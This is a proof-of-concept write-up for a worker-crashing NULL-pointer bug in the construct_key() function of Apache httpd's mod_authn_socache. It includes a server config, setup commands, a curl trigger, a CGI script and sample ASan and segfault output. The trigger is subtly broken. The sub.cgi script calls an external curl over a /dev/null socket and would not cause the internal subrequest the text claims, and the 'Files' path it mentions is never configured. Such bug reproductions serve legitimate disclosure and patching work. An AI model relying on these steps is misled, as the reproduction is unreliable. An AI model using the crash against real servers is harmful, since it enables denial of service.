# PoC 109 — Unchecked URI Slash In Authn Socache Key Construction

`construct_key()` calls `strrchr(r->uri, '/')` and subtracts the result from
`r->uri` without checking for `NULL`. A slashless `r->uri` (e.g. `""` on an
internal subrequest) yields wild pointer arithmetic that drives `apr_palloc`
and `strncat` with a garbage size, crashing the worker.

## Setup

`mod_authn_socache` configured as a caching layer over `mod_authn_file`,
default `AuthnCacheContext directory`. A `Files` block with an empty file
pattern is the simplest way to land an empty `r->uri` in
`construct_key()` via an internal subrequest.

`httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
LoadModule auth_basic_module       modules/mod_auth_basic.so
LoadModule authn_core_module       modules/mod_authn_core.so
LoadModule authn_file_module       modules/mod_authn_file.so
LoadModule authn_socache_module    modules/mod_authn_socache.so
LoadModule authz_user_module       modules/mod_authz_user.so
LoadModule socache_shmcb_module    modules/mod_socache_shmcb.so
LoadModule unixd_module            modules/mod_unixd.so

AuthnCacheSOCache shmcb
AuthnCacheEnable
AuthnCacheProvideFor file

DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    AuthType Basic
    AuthName "x"
    AuthBasicProvider socache file
    AuthUserFile /tmp/htpasswd
    Require valid-user
</Directory>
```

Run httpd under AddressSanitizer (`-fsanitize=address`) for a clean trip
report; otherwise expect a SIGSEGV depending on what sits before the heap
arena.

```bash
htpasswd -bcB /tmp/htpasswd alice secret
mkdir -p /tmp/htdocs && touch /tmp/htdocs/file.txt
```

## Trigger

The bug is reachable when `construct_key()` runs with `r->uri == ""`. Two
practical paths:

1. CGI / mod_lua subrequest with an empty target (`ap_sub_req_lookup_uri("",
   r, NULL)`). Drop a small CGI under a separate non-auth directory that
   issues such a subrequest into the protected dir.
2. A `Files` config that uses authn-socache and a request whose translated
   URI ends up empty during a per-file lookup.

Concrete request that exercises (1):

```bash
curl -u alice:secret -sv http://127.0.0.1:8080/cgi-bin/sub.cgi
```

Where `sub.cgi` is:

```bash
#!/bin/sh
exec /usr/bin/curl -s --unix-socket /dev/null \
     -u alice:secret 'http://localhost/' >/dev/null
echo "Status: 200"; echo "Content-Type: text/plain"; echo; echo done
```

(The exact subrequest mechanism is environment-dependent; under ASan a
direct unit test of `construct_key()` with `r->uri = ""` reproduces the
fault deterministically.)

## Observed effect

Worker crashes with one of:

```text
==1234==ERROR: AddressSanitizer: requested allocation size 0xfffffffffffffffe
              exceeds maximum supported size of 0x10000000000
    #0 ... in apr_palloc
    #1 construct_key  modules/aaa/mod_authn_socache.c:276
```

or, without ASan:

```text
[core:notice] child pid 1234 exit signal Segmentation fault (11)
```

`error_log` shows the auth lookup never completing. With the patch, the
zero-length prefix path runs cleanly and authentication proceeds.

## Marker

ASan `requested allocation size 0xff...` line citing `construct_key` at
`mod_authn_socache.c:276`, or a SIGSEGV in the same frame.
